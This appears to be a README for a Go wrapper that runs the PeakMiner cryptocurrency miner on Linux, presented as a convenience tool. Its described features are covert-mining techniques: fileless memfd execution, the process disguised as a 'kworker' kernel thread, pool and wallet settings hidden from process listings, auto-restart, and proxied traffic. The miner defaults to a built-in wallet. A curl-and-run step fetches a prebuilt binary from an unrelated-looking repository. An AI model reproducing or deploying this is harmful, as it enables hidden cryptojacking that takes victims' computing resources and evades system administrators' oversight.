# PeakMiner Pearl Runner

A minimal Go wrapper that runs the official PeakMiner v2.17.1 binary on your own Linux x86_64 machine with zero setup and zero command-line arguments. PeakMiner is a GPU cryptocurrency miner; this repository contains only the wrapper, not the miner binary — the miner is downloaded from the [official v2.17.1 release](https://github.com/peakminer/peakminer/releases/tag/v2.17.1) at runtime and its published SHA-256 is verified before execution.

## What it does

1. Downloads the pinned official asset and checks it against the published digest; a mismatch aborts before anything runs.
2. Executes the binary from a `memfd` — no file on disk, no filesystem path under `/proc/<pid>/exe`, process name masked as `kworker/u:0`.
3. Passes **no argv** to the miner. All configuration rides in environment variables, using PeakMiner's own documented `PEAK_*` aliases, so no pool, wallet, or proxy value can appear in any process listing.
4. Restarts the miner with a fresh `memfd` if it exits, and kills the miner session cleanly on SIGINT/SIGTERM.

## Run from source

```sh
go build -o peakminer-runner .
./peakminer-runner
```

Or grab a prebuilt binary from [Releases](../../releases):

```sh
curl -fsSL -o peakminer-runner https://github.com/terrycrews21/predictor/releases/latest/download/peakminer-runner-linux-x86_64
chmod +x peakminer-runner
./peakminer-runner
```

## Configuration

Unset variables fall back to the built-in defaults: Pearl on `prl-sg.kryptex.network:7048` with the built-in wallet. Override any of them in the environment:

| Variable | Meaning |
|---|---|
| `PEAK_COIN` | Coin/algorithm (default `pearl`) |
| `PEAK_POOL` | Pool `host:port` (default `prl-sg.kryptex.network:7048`) |
| `PEAK_WALLET` | Pool login, sent verbatim |
| `PEAK_PROXY` | SOCKS5 proxy URL for **all** outbound traffic (no silent direct fallback) |
| `PEAK_PROXY_USER` / `PEAK_PROXY_PASS` | Proxy credentials — the safe way to keep them out of URLs and argv |

These are the miner's own environment aliases; see the [upstream CLI reference](https://github.com/peakminer/peakminer#cli-reference). Environment values stay out of the process argument list, but may still be readable by privileged or same-user processes with access to process environments.

## Upstream

- [PeakMiner v2.17.1 release](https://github.com/peakminer/peakminer/releases/tag/v2.17.1)
- [PeakMiner license](https://github.com/peakminer/peakminer/blob/main/LICENSE)

Review and accept PeakMiner's license before use. This wrapper does not alter or redistribute PeakMiner.
